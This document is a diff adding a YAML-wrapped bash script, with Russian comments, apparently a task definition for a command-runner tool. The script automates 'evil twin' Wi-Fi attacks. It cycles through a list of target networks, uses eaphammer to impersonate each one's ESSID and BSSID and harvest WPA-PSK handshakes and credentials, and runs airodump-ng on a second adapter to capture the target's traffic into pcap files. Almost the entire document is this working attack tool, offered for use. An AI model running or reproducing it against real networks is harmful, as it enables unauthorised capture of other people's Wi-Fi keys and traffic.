@@ -1,0 +1,105 @@
+description: |- 
+  Поднимает поддельные точки доступа по таймауту на одном адаптере и перехватывает трафик на втором - так выходит получить наиболее валидные результаты.
+
+  ВНИМАНИЕ! Любое внешнее логирование судя по всему ломает eaphammer - и встроенные функции bshm, и tee... Мистика!
+tags:
+  - wpa-psk
+  - evil twin pulsar
+  - handshake capture
+
+arguments:
+  ap-wlan:
+    description: имя интерфейса wlan для AP
+    replacer: '#ap-wlan#'
+  mon-wlan:
+    description: имя интерфейса wlan для мониторинга
+    replacer: '#mon-wlan#' 
+  list:
+    description: 'файлы со списками параметров точек доступа в формате "ESSID;BSSID;CHANNEL" (например: "FakeAP;2f:db:4c:70:74:74;8")'
+    multiple: true
+    replacer: '#list#'
+  t:
+    description: время в секундах для переключения между точками
+    default: 30
+    replacer: '#timeout#'
+    metavar: SECONDS
+    regex: '[0-9]+'
+  d:
+    description: директория, куда скрипт будет складывать .cap файлы (их будет много!)
+    default: 'pulsar-ap'
+    replacer: '#dir#'
+    metavar: DIRECTORY
+
+mode:
+  format:
+    ap-wlan: '{!r}'
+    mon-wlan: '{!r}'
+    list: '{!r}'
+    t: '{}s'
+
+shell: bash
+
+script: |-
+  interface=#ap-wlan#;
+  monitor=#mon-wlan#;
+  outdir=#dir#;
+  OLDIFS=$IFS;
+
+  # Проверки
+  iw dev $interface info 2>&1 1>/dev/null || { echo "Device $interface not found"; exit ; };
+  iw dev $monitor info 2>&1 1>/dev/null || { echo "Device $monitor not found"; exit ; };
+  filenotfound=false;
+  for file in #list#; do test -e $file || { filenotfound=true; echo -e "\e[1;91m[error] File $file not exist\e[0m"; }; done;
+  if $filenotfound; then exit; fi;
+  
+  # Функции
+  stop_mon_screen() { sudo screen -S pulsar-monitor-proc -X stuff '^C'; };
+  exit_func() { stop_mon_screen; exit; };
+
+  mkdir -p $outdir;
+  while true; do
+    IFS=$'\n';
+    for ap in $(cat #list# | sort -u | sort -R | grep -v -e '^;'); do
+      # Параметры
+      essid=$(echo $ap | awk -F ';' '{print $1}');
+      bssid=$(echo $ap | awk -F ';' '{print $2}');
+      channel=$(echo $ap | awk -F ';' '{print $3}');
+      suffix=$(echo $essid | sed "s:[^[:alnum:]_./а-яА-Я]\+:_:g");
+      aphsfile=$(realpath $outdir/apdump-${suffix}-$(date +%Y%m%d%H%M%S).cap);
+      monhsfile=$(realpath $outdir/mondump-${suffix}-$(date +%Y%m%d%H%M%S));
+      echo -e "\e[1;93m[target] ESSID: \e[0m$essid";
+      echo -e "\e[1;93m[target] BSSID: \e[0m$bssid";
+      echo -e "\e[1;93m[target] CH:    \e[0m$channel";
+
+      # Мониторинг
+      echo -e "\e[1;92m[$monitor] Starting capture... \e[0m";
+      sudo screen -XS pulsar-monitor-proc quit >/dev/null;
+      sudo nmcli dev set $monitor managed no; sleep 1;
+      sudo ip link set $monitor down;
+      sudo iw $monitor set monitor control;
+      sudo ip link set $monitor up;
+      sudo screen -dmS pulsar-monitor-proc airodump-ng $monitor -c $channel --bssid $bssid --write $monhsfile --output-format pcap;
+
+      # Точка доступа
+      echo -e "\e[1;92m[$interface] Starting access point... \e[0m";
+      sudo nmcli dev set $interface managed no; sleep 1;
+      sudo ip link set $interface down;
+      sudo iw $interface set type managed; 
+      sudo ip link set $interface up;
+      sudo nmcli dev set $interface managed yes; sleep 1;
+      sudo timeout -s INT -k 20s #timeout# eaphammer --interface "$interface" --essid "$essid" --auth wpa-psk --password 00000000 --creds --psk-capture-file "$aphsfile" --bssid "$bssid" --channel "$channel";
+      
+      # Выход
+      stop_mon_screen; sleep 1;
+      trap exit_func SIGINT;
+      echo; 
+      echo -e "\e[1;91m[pause] Press CTRL+C to exit\e[0m";
+      IFS=$OLDIFS;
+      for i in 5 4 3 2 1; do echo -n "$i... "; sleep 1; done; 
+      IFS=$'\n';
+      sudo screen -XS pulsar-monitor-proc quit >/dev/null;
+      echo;
+    done;
+    IFS=$OLDIFS;
+  done;
+  
